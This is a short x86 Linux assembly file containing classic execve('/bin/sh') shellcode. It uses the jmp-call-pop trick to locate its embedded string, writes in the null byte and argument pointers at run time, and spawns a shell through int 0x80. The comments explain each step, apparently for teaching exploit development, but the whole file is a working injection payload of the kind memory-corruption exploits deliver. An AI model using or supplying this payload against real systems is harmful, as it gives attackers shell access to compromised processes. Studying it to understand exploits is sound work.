.section .text
.global _start

_start:	
	/* we first jump to string address and then immediately return
	via a call, so that when we arrive at mystart, the address of
	the string will be on the stack. Clever. */
	jmp string_addr 	

mystart:
	pop %ebx 		/* get the string address */	
	xor %eax,%eax		/* zero eax */

	movb %al, 7(%ebx)	/* move a NULL in 'N' position of the string */
	movl %ebx, 8(%ebx)	/* mov the address of the string in XXXX */

	movl %eax, 12(%ebx)	/* mov 0 (32b) in YYYY */
	
	movb $11,%al		/* syscall 11 = execve */

	/* first argument (ebx) points to the file */
	leal 8(%ebx), %ecx	/* address of second argument in ecx*/
	leal 12(%ebx), %edx	/* address of third argument in ecx*/

	int $0x80		/* do it */

string_addr:
	call mystart
	.asciz "/bin/shNXXXXYYYY"
	 
